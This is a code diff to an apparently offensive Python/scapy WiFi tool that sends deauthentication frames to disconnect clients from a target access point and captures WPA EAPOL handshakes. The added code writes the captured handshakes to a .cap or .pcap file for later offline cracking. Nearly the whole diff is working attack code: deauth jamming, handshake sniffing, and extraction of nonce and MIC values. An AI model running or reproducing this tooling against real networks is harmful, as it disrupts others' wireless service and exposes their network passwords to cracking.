@@ -10,6 +10,7 @@ import subprocess
 from pull import PULL
 from scapy.sendrecv import sniff
 from scapy.sendrecv import sendp
+from scapy.utils    import PcapWriter
 from scapy.packet   import Raw
 from scapy.layers.dot11 import RadioTap
 from scapy.layers.dot11 import Dot11Deauth
@@ -33,8 +34,11 @@ class CAPTURE:
 	JAMMERSTA = True
 
 	__CRATE   = {}
+	__CAPTURED= []
 
-	def __init__(self, iface, bssid, essid, channel, power, device, encryption, cipher, auth, stations):
+	FIRSTSTORE= True
+
+	def __init__(self, iface, bssid, essid, channel, power, device, encryption, cipher, auth, stations, outfname):
 		self.interface = iface
 		self.bssid = bssid
 		self.essid = essid
@@ -45,6 +49,15 @@ class CAPTURE:
 		self.cipher  = cipher
 		self.auth    = auth
 		self.stations = stations
+		self.output   = self.output(outfname)
+
+	def output(self, ofname):
+		if ofname.endswith(".cap") or ofname.endswith(".pcap"):
+			return ofname
+		elif ofname.endswith("."):
+			return (ofname + "cap")
+		else:
+			return (ofname + ".cap")
 
 	def channeler(self):
 		ch = str(self.channel)
@@ -114,6 +127,35 @@ class CAPTURE:
 			verbose=False
 		)
 
+	def write(self, pkts):
+		fl = PcapWriter(self.output, append=(False if self.FIRSTSTORE else True), sync=True)
+		self.FIRSTSTORE = False
+
+		fl.write(
+			list(
+				pkts.values()
+			)
+		)
+
+	def loop(self):
+		for sta in list(self.__CRATE.keys()):
+			pkts = self.__CRATE[ sta ]
+
+			if pkts.get(1) and pkts.get(2) and pkts.get(3) and pkts.get(4) and sta not in self.__CAPTURED:
+				pull.print(
+					"$",
+					"EAPOL Captured. ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
+						ap=self.bssid.upper(),
+						apvendor=pull.DARKCYAN+self.device+pull.END,
+						sta=sta.upper(),
+						stavendor=pull.DARKCYAN+pull.get_mac(sta)+pull.END,
+						essid=pull.YELLOW+self.essid+pull.END
+					),
+					"\r", pull.GREEN
+				)
+				self.write( pkts )
+				self.__CAPTURED.append( sta )
+
 	def jammer(self):
 		tgts = self.forgerer()
 
@@ -129,11 +171,13 @@ class CAPTURE:
 				if self.JAMMERRUN:
 					pull.print(
 						"-",
-						"Deauth Sent. CODE [{code}] {ap} <--> {sta} ({essid})".format(
-							code=7,
-							ap=ap,
-							sta=sta,
-							essid=self.essid,
+						"Deauth Sent. CODE [{code}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
+							code     =pull.RED+str(7)+pull.END,
+							apvendor =pull.DARKCYAN+pull.get_mac(ap)+pull.END,
+							ap       =ap.upper(),
+							stavendor=pull.DARKCYAN+pull.get_mac(sta)+pull.END,
+							sta      =sta.upper(),
+							essid    =pull.YELLOW+self.essid+pull.END,
 						),
 						"\r", pull.RED
 					)
@@ -165,20 +209,21 @@ class CAPTURE:
 				self.__CRATE[ tgt ][ 4 ] = None
 			
 			if fds == True:
-				nonce = binascii.hexlify(pkt.getlayer(Raw).load)[26:90]
-				mic   = binascii.hexlify(pkt.getlayer(Raw).load)[154:186]
+				nonce = binascii.hexlify(pkt.getlayer(Raw).load)[26:90].decode()
+				mic   = binascii.hexlify(pkt.getlayer(Raw).load)[154:186].decode()
 				if sn == self.bssid and nonce != self.FNONCE and mic == self.FMIC:
 					self.__CRATE[ tgt ][ 1 ] = pkt
-					print("Captured")
 				elif sn == self.bssid and nonce != self.FNONCE and mic != self.FMIC:
 					self.__CRATE[ tgt ][ 3 ] = pkt
 			elif tds == True:
-				nonce = binascii.hexlify(pkt.getlayer(Raw).load)[26:90]
-				mic   = binascii.hexlify(pkt.getlayer(Raw).load)[154:186]
+				nonce = binascii.hexlify(pkt.getlayer(Raw).load)[26:90].decode()
+				mic   = binascii.hexlify(pkt.getlayer(Raw).load)[154:186].decode()
 				if rc == self.bssid and nonce != self.FNONCE and mic != self.FMIC:
 					self.__CRATE[ tgt ][ 2 ] = pkt
 				elif rc == self.bssid and nonce == self.FNONCE and mic != self.FMIC:
 					self.__CRATE[ tgt ][ 4 ] = pkt
+
+			self.loop()
 
 	def crater(self):
 		for sta in self.stations:
